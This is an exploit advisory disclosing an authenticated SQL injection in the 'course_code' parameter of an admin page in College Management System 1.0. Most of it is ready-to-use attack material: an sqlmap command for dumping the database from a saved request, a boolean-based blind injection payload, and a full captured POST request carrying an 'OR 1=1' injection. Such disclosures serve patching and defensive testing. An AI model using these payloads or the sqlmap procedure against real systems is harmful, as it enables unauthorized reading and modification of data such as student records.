# College Management System - 'course_code' SQL Injection (Authenticated)

1. Description:
----------------------

College Management System 1.0 allows SQL Injection via parameter 'course_code' in
/College-Management-System/admin/asign-single-student-subjects.php. Exploiting this issue could allow an attacker to compromise
the application, access or modify data, or exploit latent vulnerabilities
in the underlying database.


2. Proof of Concept:
----------------------

In Burpsuite intercept the request from the affected page with
'course_code' parameter and save it like poc.req. Then run SQLmap to extract the
data from the database:

sqlmap -r poc.req --dbms=mysql


3. Example payload:
----------------------

boolean-based blind
Payload: submit=Press&roll_no=3&course_code=-6093' OR 2121=2121 AND 'ddQQ'='ddQQ


4. Burpsuite request:
----------------------

POST /College-Management-System/admin/asign-single-student-subjects.php HTTP/1.1<br>
Host: localhost<br>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8<br>
Accept-Encoding: gzip, deflate<br>
Accept-Language: en-us,en;q=0.5<br>
Cache-Control: no-cache<br>
Content-Length: 80<br>
Content-Type: application/x-www-form-urlencoded<br>
Cookie: PHPSESSID=jhnlvntmv8q4gtgsof9l1f1hhe<br>
Referer: http://localhost/College-Management-System/admin/asign-single-student-subjects.php<br>
User-Agent: Mozilla/5.0 (Windows NT 10.0; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.0 Safari/537.36<br>
<br>
submit=Press&roll_no=3&course_code=Select+Course%27+OR+1%3d1+OR+%27ns%27%3d%27ns
